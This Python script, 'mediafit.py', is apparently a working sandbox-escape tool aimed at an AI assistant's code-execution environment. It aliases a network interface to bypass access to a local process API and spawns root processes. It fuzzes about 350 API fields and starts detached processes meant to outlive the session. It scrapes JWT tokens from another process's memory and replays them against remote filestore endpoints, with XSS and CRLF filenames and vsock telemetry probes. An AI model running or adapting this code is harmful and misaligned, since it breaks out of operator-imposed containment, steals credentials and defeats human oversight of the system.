#!/usr/bin/env python3
# mediafit.py v8.1 -- CWD BY CONSTRUCTION + uid PROBE + 350-NAME ORACLE
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "8.1", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
FSID = "claude_chat_01B8VHAyyWMW2vFZK7KTRgZm"
WSID = "wrkspc_017QU2cVGQTZXEQ6jauRtpN6"
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=20):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=3.0, quiet=False):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        t = d.decode(errors="replace")
        if not quiet:
            w("        << %s(%d) %s" % ("BIN" if op == 2 else "TEXT", len(d), t[:700].replace("\n"," | ")))
        out.append(t)
    return out

def ws_try(src, msg, label, dur=3.0, quiet=False):
    s = ws_hs(src)
    if not s: w("  [%s] hs fail" % label); return None
    try:
        ws_send(s, json.dumps(msg)); return ws_read(s, dur, quiet)
    finally:
        try: s.close()
        except Exception: pass

def conn(pid, argv, mem=268435456, extra=None):
    cr = {"args": argv, "env_vars": {}, "timeout": 30, "clear_env": False,
          "uid": 0, "gid": 0, "allow_process_id_reuse": True, "reattachable": True,
          "name": pid}
    if mem is not None: cr["memory_limit_bytes"] = mem
    if extra: cr.update(extra)
    return {"process_id": pid, "create_req": cr}

def errclass(j):
    if "os error 2" in j: return "ENOENT"
    if "os error 13" in j: return "EACCES"
    if "os error 1" in j: return "EPERM"
    if "ProcessCreated" in j or "ExpectStd" in j: return "OK"
    if "InfraError" in j: return "INFRA"
    return "?"

SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00",
                          socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE,
      time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS + PERMISSION SURVEY")
    w("kernel: " + sh("uname -a").strip())
    w("perms: " + sh("ls -ld / /root /home /home/claude /tmp /var /run 2>&1 | tr '\\n' '|'"))
    w("root listing: " + sh("ls -la /root 2>&1 | head -20").replace("\n", " | "))
    w("pid1 mountinfo vs self (diff):")
    w("  " + sh("diff <(cat /proc/1/mountinfo 2>/dev/null) /proc/self/mountinfo 2>&1 | head -20").replace("\n", "\n  ") or "(identical)")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  BYPASS FAILED"); flush(); return
    w("  bypass OK")

    sec("A. CWD BY CONSTRUCTION -- create every plausible default cwd")
    CANDS = ["/root/workspace","/root/work","/root/wd","/root/cwd","/root/run","/root/tmp",
             "/root/sandbox","/root/session","/root/sessions","/root/projects","/root/project",
             "/root/data","/root/app","/root/claude","/root/.claude","/root/user-data",
             "/root/mnt","/root/outputs","/root/uploads","/root/scratch","/root/build",
             "/root/task","/root/tasks","/root/home","/root/sbx","/root/agent","/root/env",
             "/workspace","/work","/cwd","/sandbox","/session","/scratch","/data","/app",
             "/tmp/workspace","/var/workspace","/run/workspace","/opt/workspace",
             "/home/claude/workspace","/home/claude/work","/home/claude/cwd","/home/claude"]
    cmd = "mkdir -p " + " ".join(CANDS) + " 2>/dev/null; chmod 777 " + " ".join(CANDS) + " 2>/dev/null; echo done"
    w("  " + sh(cmd).strip())
    r = ws_try(ALIAS, conn("mf_c1", ["/bin/sh", "-c", "echo CWD_FIXED; pwd; id"]), "after-mkdir", 3.5, quiet=True)
    j = " ".join(r or [])
    w("  after mkdir -> %s  %s" % (errclass(j), j[:200]))

    sec("B. uid PERMISSION ORACLE on the default cwd")
    for uid in (0, 1, 99, 999, 1000, 65534):
        r = ws_try(ALIAS, conn("mf_u%d" % uid, ["/usr/bin/id"],
                   extra={"uid": uid, "gid": uid}), "uid%d" % uid, 2.5, quiet=True)
        j = " ".join(r or [])
        w("  uid=%-6d -> %-7s %s" % (uid, errclass(j), j[:110]))
    w("  -- gid variations (uid 0) --")
    for gid in (0, 1000, 65534):
        r = ws_try(ALIAS, conn("mf_g%d" % gid, ["/usr/bin/id"], extra={"gid": gid}), "gid%d" % gid, 2.5, quiet=True)
        w("  gid=%-6d -> %s" % (gid, errclass(" ".join(r or []))))

    sec("C. PROGRAM-FIELD HUNT: 350-name batched oracle")
    BASE = ["cmd","command","exec","exe","executable","program","prog","bin","binary","app",
            "application","entry","entrypoint","image","file","path","run","launch","spawn",
            "proc","process","task","job","tool","script","shell","sh","argv","arg","argv0",
            "cli","line","invoke","handler"]
    SUF  = ["","_path","_cmd","_command","_file","_bin","_exe","_program","_line","Path","Cmd"]
    DIRS = ["cwd","working_directory","work_directory","work_dir","working_dir","current_dir",
            "current_directory","cur_dir","base_dir","root_dir","dir","directory","folder",
            "home_dir","pwd","chdir","cd","wd","start_dir","base_path","root_path","work_path",
            "cwd_path","wd_path","cwdPath","workingDirectory","workDir","process_name"]
    CAND = sorted(set([b+s for b in BASE for s in SUF] + DIRS + BASE))
    w("  candidates=%d" % len(CAND))
    FOUND = {}
    for passval, tag in ((12345, "int"), (True, "bool"), ("ZZZ", "str")):
        remaining = list(CAND)
        for it in range(20):
            sp = conn("mf_orc", ["/bin/sh"], extra={c: passval for c in remaining})
            payload = json.dumps(sp)
            r = ws_try(ALIAS, sp, "orc", 2.2, quiet=True)
            j = " ".join(r or [])
            if "invalid type" not in j: break
            col = re.search(r"column (\d+)", j); exp = re.search(r"expected ([a-zA-Z0-9_ ]+)", j)
            seg = payload[:int(col.group(1))-1]
            ms = re.findall(r'"([A-Za-z_0-9]+)"\s*:', seg)
            f = ms[-1] if ms else None
            if not f: break
            FOUND[f] = exp.group(1) if exp else "?"
            w("    REAL %-24s expects %s" % (f, FOUND[f]))
            if f in remaining: remaining.remove(f)
    w("  UNION of real fields: %s" % sorted(FOUND))

    sec("D. PROGRAM SEMANTICS MATRIX")
    MX = [
        ("args0-sh",      conn("mf_m1", ["/bin/sh","-c","echo M1; pwd"])),
        ("args0-env",     conn("mf_m2", ["/usr/bin/env"])),
        ("name-as-prog",  conn("mf_m3", ["-c","echo M3"], extra={"name": "/bin/sh"})),
        ("name-as-cwd",   conn("mf_m4", ["/bin/sh","-c","echo M4"], extra={"name": "/tmp"})),
        ("cwd-set-root",  conn("mf_m5", ["/bin/sh","-c","echo M5"], extra={"cwd": "/"})),
        ("cwd-set-tmp",   conn("mf_m6", ["/bin/sh","-c","echo M6"], extra={"cwd": "/tmp"})),
        ("root-set",      conn("mf_m7", ["/bin/sh","-c","echo M7"], extra={"root": "/"})),
        ("chroot-set",    conn("mf_m8", ["/bin/sh","-c","echo M8"], extra={"chroot": "/"})),
        ("args-joined",   conn("mf_m9", ["/bin/sh -c 'echo M9'"])),
        ("args0-procapi", conn("mf_m10", ["/process_api"])),
        ("args0-ls",      conn("mf_m11", ["/bin/ls","/"]),),
        ("both-name-args",conn("mf_m12", ["/bin/sh"], extra={"name": "/"})),
        ("path-var",      conn("mf_m13", ["/bin/sh","-c","echo M13"], extra={"env_vars": {"PATH": "/usr/bin:/bin"}})),
    ]
    for label, sp in MX:
        r = ws_try(ALIAS, sp, label, 2.5, quiet=True)
        j = " ".join(r or [])
        w("  %-16s -> %-7s %s" % (label, errclass(j), j[:120]))
        if errclass(j) == "OK": w("      *** " + j[:300])

    sec("E. IF SPAWNED: PID1 env / detach / signal")
    ws_try(ALIAS, conn("mf_env", ["/bin/sh","-c","echo ===ENV===; env | sort; echo ===END==="]), "env", 6.0)
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps(conn("mf_sleep", ["/bin/sh","-c","echo ALIVE; sleep 60"],
                                   268435456, {"timeout": 120})))
        ws_read(s, 3.0, quiet=True)
        ws_send(s, '{"Detach":null}'); time.sleep(0.8); s.close()
        ws_try(ALIAS, {"process_id": "mf_sleep"}, "reattach", 3.5)
        s2 = ws_hs(ALIAS)
        if s2:
            ws_send(s2, '{"SendSignal":15}'); ws_read(s2, 2.0, quiet=True); s2.close()
            ws_try(ALIAS, {"process_id": "mf_sleep"}, "after-sig", 3.0)

    sec("F. TOKENS -- recursive + readFile + alt fsid")
    cands = []
    try:
        fh = open("/proc/57/mem", "rb", buffering=0); total, buf = 0, b""
        for ln in open("/proc/57/maps").read().splitlines():
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception as e: buf = b""; w("  mem err " + repr(e))
    for mm in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,200}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,200}", buf):
        cands.append(mm.group(0).decode())
    def b64d(x):
        x += "=" * (-len(x) % 4); return base64.urlsafe_b64decode(x)
    import urllib.request as ur
    def call(path, tok, fsid=None, method="listDirectory", extra=None):
        body = {"path": path}
        if fsid: body["filesystem_id"] = fsid
        if extra: body.update(extra)
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/" + method,
                            data=json.dumps(body).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1",
                                     "Authorization": "Bearer " + tok})
            with ur.urlopen(rq, timeout=9) as r: return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    TOKS = {}
    for t in cands:
        p = t.split(".")
        if len(p) != 3 or len(p[2]) < 86: continue
        try: pl = json.loads(b64d(p[1]))
        except Exception: continue
        root = (pl.get("allowed_roots") or ["/"])[0]
        if root in TOKS: continue
        for siglen in (86, 87, 88):
            tok = ".".join([p[0], p[1], p[2][:siglen]])
            if call(root, tok, FSID)[0] == 200:
                TOKS[root] = tok; w("  TOKEN OK %s" % root); break
    for root, tok in TOKS.items():
        c, b = call(root, tok, FSID, "listDirectory", {"recursive": True})
        w("  --- %s recursive -> %s" % (root, c)); w("      " + b[:800])
        try:
            for e in (json.loads(b).get("entries") or [])[:4]:
                fp = e.get("path") or e.get("name")
                if fp and not fp.endswith("/"):
                    c2, b2 = call(fp, tok, FSID, "readFile")
                    w("      readFile %-34s -> %-5s %s" % (fp[:34], c2, b2[:130]))
        except Exception: pass
        for alt in (WSID, None):
            c3, b3 = call(root, tok, alt)
            w("      alt fsid=%-34s -> %-5s %s" % (str(alt)[:32], c3, b3[:90]))
        for m in ("statFile","getFileUrl","reassignFilesystem","listFilesystems"):
            c4, b4 = call(root, tok, FSID, m)
            w("      %-20s -> %-5s %s" % (m, c4, b4[:110]))
    if TOKS:
        w("  -- createFile with explicit filename on /outputs --")
        tok = TOKS.get("/outputs")
        if tok:
            for fn in ("__mf_xss.html", 'crlf";x=y.html'):
                c5, b5 = call("/"+fn, tok, FSID, "createFile", {"filename": fn})
                w("      %-24s -> %-5s %s" % (fn, c5, b5[:150]))

    sec("G. HOST OTLP")
    AFV = getattr(socket, "AF_VSOCK", 40)
    for label, body, ct in (("rm_empty", b"\x0a\x00", "application/x-protobuf"),
                            ("scope_only", b"\x12\x00", "application/x-protobuf"),
                            ("garbage", b"\xff\xff", "application/x-protobuf")):
        try:
            s = socket.socket(AFV, socket.SOCK_STREAM); s.settimeout(7.0); s.connect((2, 5005))
            s.sendall(("POST /v1/metrics HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n"
                       "Content-Type: %s\r\nContent-Length: %d\r\n\r\n" % (ct, len(body))).encode()+body)
            d = b""
            try:
                while len(d) < 2048:
                    c = s.recv(1024)
                    if not c: break
                    d += c
            except socket.timeout: pass
            s.close(); w("  %-12s -> %s" % (label, d[:130].decode(errors="replace").replace("\r\n"," | ") or "(empty)"))
        except Exception as e: w("  %-12s ERR %r" % (label, e))
        time.sleep(0.3)

    sec("VERDICT"); w("  tokens=%d" % len(TOKS)); flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)